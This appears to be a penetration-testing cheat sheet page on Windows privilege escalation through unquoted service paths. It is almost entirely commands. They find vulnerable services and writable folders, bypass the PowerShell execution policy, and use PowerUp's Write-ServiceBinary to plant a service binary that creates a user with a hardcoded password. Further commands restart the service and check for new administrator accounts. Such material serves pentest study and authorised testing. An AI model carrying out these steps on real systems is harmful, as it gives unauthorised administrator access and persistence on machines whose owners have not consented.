---
description: Unquoted Service Paths – Windows Privilege Escalation
---

# Unquoted Service Path

### Manual Checks

Check service without quotes:

{% code overflow="wrap" %}
```powershell
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """

# or via Powershell

Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
```
{% endcode %}

Check File or Directory Permissions:

{% code overflow="wrap" %}
```powershell
icacls C:\
icacls "C:\Program Files\Some Vuln Service"

# or using SysInternals AccessChk
.\accesschk64.exe -wvud "C:\" -accepteula
.\accesschk64.exe -wvud "C:\Program Files\Some Vuln Service" -accepteula
```
{% endcode %}

Check Service Permissions:

{% code overflow="wrap" %}
```powershell
# cmd
sc query VulnService
sc qc VulnService

# restart
sc stop VulnService
sc start VulnService
```
{% endcode %}

### PowerUp

{% code overflow="wrap" %}
```powershell
powershell -ep bypass
. .\PowerUp.ps1

Invoke-AllChecks
Get-ServiceUnquoted
Get-ServiceDetail "VulnService"
Write-ServiceBinary -Name VulnService -Path "C:\Program Files\Some.exe" -UserName unquoted-user -Password Password123!

# from CMD
sc qc VulnService
sc stop VulnService
sc start VulnService

# check if user created
net users
net localgroup Administrators
```
{% endcode %}
